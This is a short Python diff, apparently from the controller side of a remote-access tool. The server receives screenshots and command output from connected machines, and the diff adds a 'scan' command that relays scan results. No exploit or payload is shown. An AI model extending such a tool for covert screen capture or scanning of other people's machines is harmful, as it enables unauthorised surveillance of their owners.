@@ -25,9 +25,14 @@ def handle_connection(connection, address):
 
                 with open("screen.png", "wb") as f:
                     f.write(img_data)
-                print("Capture reussie !")
+                print("Capture réussie !")
                 continue
 
+            elif command.startswith("scan"):
+                print("Scan en cours...")
+                response = connection.recv(4096).decode()
+                print(f"Résultat du scan :\n{response}")
+                continue
 
             response = connection.recv(4096).decode()
             print(f"Output:\n{response}")
